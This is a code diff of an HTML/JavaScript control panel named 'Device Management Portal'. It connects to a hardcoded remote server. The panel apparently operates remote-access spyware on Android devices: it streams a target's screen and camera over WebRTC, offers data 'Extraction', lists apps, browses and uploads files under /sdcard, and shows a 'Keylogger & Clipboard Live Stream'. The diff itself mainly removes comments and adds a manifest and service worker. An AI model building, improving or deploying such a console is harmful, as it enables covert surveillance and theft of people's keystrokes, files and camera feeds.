@@ -4,6 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Device Management Portal</title>
+<link rel="manifest" href="manifest.json">
+<meta name="theme-color" content="#0f172a">
 <script src="https://cdn.tailwindcss.com"></script>
 <script>
 tailwind.config = { darkMode: 'class' }
@@ -17,8 +19,6 @@ video { background: #000; }
 <body class="bg-slate-100 dark:bg-slate-950 text-slate-800 dark:text-slate-200 transition-colors duration-300">
 
 <div class="flex min-h-screen">
-
-    <!-- Sidebar -->
     <aside id="sidebar" class="fixed lg:static inset-y-0 left-0 z-50 w-64 bg-white dark:bg-slate-900 border-r border-slate-200 dark:border-slate-800 transform -translate-x-full lg:translate-x-0 transition-transform duration-300 flex flex-col">
         <div class="h-16 flex items-center px-6 border-b border-slate-200 dark:border-slate-800">
             <div class="w-8 h-8 rounded-lg bg-blue-600 flex items-center justify-center text-white font-bold">D</div>
@@ -27,7 +27,6 @@ video { background: #000; }
                 <p class="text-[10px] text-slate-500">Enterprise Edition</p>
             </div>
         </div>
-
         <nav class="p-4 space-y-1 flex-1 overflow-y-auto">
             <button onclick="switchTab('live', this)" class="nav-btn w-full text-left px-4 py-2 rounded-lg text-sm bg-blue-600 text-white font-medium">📺 Live Screen</button>
             <button onclick="switchTab('camera', this)" class="nav-btn w-full text-left px-4 py-2 rounded-lg text-sm hover:bg-slate-100 dark:hover:bg-slate-800">📷 Camera</button>
@@ -38,21 +37,14 @@ video { background: #000; }
         </nav>
     </aside>
 
-    <!-- Main Content -->
     <main class="flex-1 flex flex-col min-w-0">
-
-        <!-- Topbar -->
         <header class="sticky top-0 z-30 bg-white/80 dark:bg-slate-900/80 backdrop-blur border-b border-slate-200 dark:border-slate-800 p-4">
             <div class="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
-                
-                <!-- Connection Controls -->
                 <div class="flex items-center gap-2 flex-1">
-                    <input id="server" type="text" value="https://dmanagerr.fly.dev" class="w-1/3 px-3 py-2 text-sm rounded-lg border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-800 outline-none focus:border-blue-500" placeholder="Server URL">
+                    <input id="server" type="text" value="https://dmanagerr.fly.dev" class="w-1/3 px-3 py-2 text-sm rounded-lg border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-800 outline-none focus:border-blue-500">
                     <input id="psk" type="password" placeholder="PSK" class="w-1/3 px-3 py-2 text-sm rounded-lg border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-800 outline-none focus:border-blue-500">
                     <button id="connectBtn" onclick="connect()" class="px-4 py-2 text-sm rounded-lg bg-blue-600 text-white font-medium whitespace-nowrap">Connect</button>
                 </div>
-
-                <!-- Status & Device Selector -->
                 <div class="flex items-center gap-4">
                     <div class="flex items-center gap-2 text-sm font-medium">
                         <div id="led" class="w-2.5 h-2.5 rounded-full bg-red-500"></div>
@@ -62,14 +54,10 @@ video { background: #000; }
                         <option value="">Select Device</option>
                     </select>
                 </div>
-
             </div>
         </header>
 
-        <!-- Content Area -->
         <div class="p-4 lg:p-8 flex-1 overflow-auto">
-
-            <!-- TAB: LIVE SCREEN -->
             <div id="tab-live" class="tab active space-y-6">
                 <div class="bg-white dark:bg-slate-900 rounded-xl p-6 shadow-sm border border-slate-200 dark:border-slate-800">
                     <div class="flex justify-between items-center mb-4">
@@ -85,7 +73,6 @@ video { background: #000; }
                 </div>
             </div>
 
-            <!-- TAB: CAMERA -->
             <div id="tab-camera" class="tab hidden space-y-6">
                 <div class="bg-white dark:bg-slate-900 rounded-xl p-6 shadow-sm border border-slate-200 dark:border-slate-800">
                     <div class="flex justify-between items-center mb-4">
@@ -102,17 +89,13 @@ video { background: #000; }
                 </div>
             </div>
 
-            <!-- TAB: DEVICE INFO -->
             <div id="tab-device" class="tab hidden space-y-6">
                 <div class="grid md:grid-cols-2 gap-6">
                     <div class="bg-white dark:bg-slate-900 rounded-xl p-6 shadow-sm border border-slate-200 dark:border-slate-800">
                         <h2 class="text-lg font-bold mb-4">Telemetry</h2>
-                        <div id="telemetry-data" class="space-y-3 text-sm">
-                            <div class="text-slate-500">Select a device to load data.</div>
-                        </div>
+                        <div id="telemetry-data" class="space-y-3 text-sm"><div class="text-slate-500">Select a device to load data.</div></div>
                         <button onclick="refreshTelemetry()" class="mt-6 px-4 py-2 text-sm bg-blue-600 text-white rounded-lg">Refresh Info</button>
                     </div>
-                    
                     <div class="bg-white dark:bg-slate-900 rounded-xl p-6 shadow-sm border border-slate-200 dark:border-slate-800">
                         <h2 class="text-lg font-bold mb-4">Extraction</h2>
                         <div class="grid grid-cols-2 gap-3">
@@ -126,20 +109,16 @@ video { background: #000; }
                 </div>
             </div>
 
-            <!-- TAB: APPS -->
             <div id="tab-apps" class="tab hidden space-y-6">
                 <div class="bg-white dark:bg-slate-900 rounded-xl p-6 shadow-sm border border-slate-200 dark:border-slate-800">
                     <div class="flex justify-between items-center mb-4">
                         <h2 class="text-lg font-bold">App Manager</h2>
                         <button onclick="listApps()" class="px-4 py-2 text-sm bg-blue-600 text-white rounded-lg">List Installed Apps</button>
                     </div>
-                    <div id="app-list" class="space-y-2 max-h-96 overflow-y-auto">
-                        <!-- Apps populate here -->
-                    </div>
+                    <div id="app-list" class="space-y-2 max-h-96 overflow-y-auto"></div>
                 </div>
             </div>
 
-            <!-- TAB: FILES -->
             <div id="tab-files" class="tab hidden space-y-6">
                 <div class="bg-white dark:bg-slate-900 rounded-xl p-6 shadow-sm border border-slate-200 dark:border-slate-800">
                     <h2 class="text-lg font-bold mb-4">File Manager</h2>
@@ -147,10 +126,7 @@ video { background: #000; }
                         <input id="file-path" type="text" value="/sdcard" class="flex-1 px-3 py-2 text-sm rounded-lg border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-800 outline-none">
                         <button onclick="listDir()" class="px-4 py-2 text-sm bg-blue-600 text-white rounded-lg">Go</button>
                     </div>
-                    <div id="file-list" class="space-y-2 max-h-64 overflow-y-auto mb-4 border border-slate-200 dark:border-slate-800 rounded-lg p-2">
-                        <!-- Files populate here -->
-                    </div>
-                    
+                    <div id="file-list" class="space-y-2 max-h-64 overflow-y-auto mb-4 border border-slate-200 dark:border-slate-800 rounded-lg p-2"></div>
                     <div class="grid grid-cols-2 gap-4 mt-6 border-t border-slate-200 dark:border-slate-800 pt-6">
                         <div>
                             <label class="text-sm text-slate-500 mb-2 block">Upload File</label>
@@ -166,14 +142,12 @@ video { background: #000; }
                 </div>
             </div>
 
-            <!-- TAB: LOGS -->
             <div id="tab-logs" class="tab hidden space-y-6">
                 <div class="bg-white dark:bg-slate-900 rounded-xl p-6 shadow-sm border border-slate-200 dark:border-slate-800">
                     <h2 class="text-lg font-bold mb-4">Keylogger & Clipboard Live Stream</h2>
                     <pre id="log-out" class="p-4 bg-slate-950 text-green-400 font-mono text-xs rounded-lg h-96 overflow-y-auto whitespace-pre-wrap">Waiting for logs...</pre>
                 </div>
             </div>
-
         </div>
     </main>
 </div>
@@ -192,11 +166,7 @@ function switchTab(tabId, btn) {
 }
 
 function formatUrl(url) { return url.startsWith('http') ? url.replace(/\/+$/, '') : 'https://' + url.replace(/\/+$/, ''); }
-
-function onDeviceChange() {
-    currentDevice = $('device-select').value;
-    if (currentDevice) refreshTelemetry();
-}
+function onDeviceChange() { currentDevice = $('device-select').value; if (currentDevice) refreshTelemetry(); }
 
 async function connect() {
     gPsk = $('psk').value.trim(); gServer = formatUrl($('server').value);
@@ -260,14 +230,11 @@ function addDeviceOption(id, name) {
 function startWebRtc(mode) {
     if (!currentDevice) return alert("Select a device");
     if (peerConnection) peerConnection.close();
-    
     peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-    
     peerConnection.ontrack = (event) => {
         if (mode === 'screen') $('webrtc-video').srcObject = event.streams[0];
         else $('webrtc-cam').srcObject = event.streams[0];
     };
-    
     peerConnection.onicecandidate = (event) => {
         if (event.candidate) ws.send(JSON.stringify({ type: 'webrtc_ice', device_id: currentDevice, sdpMid: event.candidate.sdpMid, sdpMLineIndex: event.candidate.sdpMLineIndex, sdp: event.candidate.candidate }));
     };
@@ -381,7 +348,7 @@ async function uploadFile() {
     reader.readAsDataURL(f);
 }
 
-// Restore session
+if ('serviceWorker' in navigator) { navigator.serviceWorker.register('/sw.js'); }
 $('server').value = sessionStorage.getItem('server') || 'https://dmanagerr.fly.dev';
 $('psk').value = sessionStorage.getItem('psk') || '';
 </script>
